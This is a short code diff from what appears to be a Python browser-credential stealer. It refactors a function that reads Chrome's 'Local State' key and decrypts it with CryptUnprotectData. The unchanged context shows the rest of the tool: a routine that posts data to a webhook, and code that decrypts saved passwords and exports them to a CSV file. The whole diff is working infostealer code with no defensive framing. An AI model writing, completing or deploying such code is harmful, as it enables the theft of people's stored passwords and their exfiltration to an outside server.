@@ -21,10 +21,10 @@ def sendToWebhook(fileToSend):
     }
     post(webhookURL, data=data)
 
-def getChromePasswordDencryptionKey(path):
-    if not os.path.exists(f"{path}\\Local State"): return
+def getChromeDencryptionKey():
+    if not os.path.exists(f"{CHROMEPATH}\\Local State"): return
 
-    localStateFile = open(f"{path}\\Local State", "r", encoding="utf-8")
+    localStateFile = open(f"{CHROMEPATH}\\Local State", "r", encoding="utf-8")
     localStateFileJson = loads(localStateFile.read())["os_crypt"]["encrypted_key"]
     
     return CryptUnprotectData(b64decode(localStateFileJson)[5:], None, None, None, 0)[1]
@@ -40,7 +40,7 @@ def decryptPassword(password, key):
             return None
 
 def getChromePasswords():
-    decryptionKey = getChromePasswordDencryptionKey(CHROMEPATH)
+    decryptionKey = getChromeDencryptionKey()
     exportedPasswordsFile = open("CDBEXP.csv", "w", newline="")
     csvWriter = writer(exportedPasswordsFile)
     i = 0
